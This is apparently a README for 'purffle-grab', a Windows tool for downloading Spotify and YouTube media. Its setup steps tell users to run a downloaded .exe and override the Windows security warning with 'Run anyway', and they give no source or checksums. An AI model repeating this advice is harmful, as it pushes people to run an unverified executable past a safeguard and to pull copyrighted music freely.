📦 purffle-grab - Download music and videos for free

Download Software

purffle-grab helps you save music and videos to your computer. Use it to grab files from Spotify and YouTube. You can save songs as MP3 files or videos as MP4 files. The tool supports high-quality downloads up to 4K resolution.

This software combines yt-dlp and ffmpeg into one simple package. You do not need to install extra software. There are no ads, and you do not need an account to use it.

🚀 How to get started

Follow these steps to set up the software on your Windows computer:

  1. Visit the download page to see all versions.
  2. Select the latest release file that ends in .exe.
  3. Click the file name to start the download to your computer.
  4. Open your Downloads folder once the process finishes.
  5. Double-click the file to open the program.

Windows might show a window that asks for permission to run the file. Click "Run" or "More info" followed by "Run anyway" to start the program.

⚙️ System Requirements

  • Operating System: Windows 10 or 11.
  • Memory: At least 4GB of RAM.
  • Storage: 200MB of free disk space.
  • Internet: An active connection is necessary to grab files from your favorite sites.

🎸 Using the app

The interface is simple and clean. Copy the link to the song or video you want to save. Paste the link into the box at the top of the app. Choose your preferred quality or format from the settings menu. Press the download button to begin the task. The app performs the conversion and saves the file to your computer.

You can also paste an entire playlist link. The app will grab all items in the list automatically. Progress bars show you how much of the file is done.

🛠️ Troubleshooting

If the app fails to start, ensure you have the correct version for your Windows system. If links fail to download, verify your internet connection. Videos listed as private might not work with this tool. If you encounter errors during the conversion process, verify that you have enough disk space for the output file.
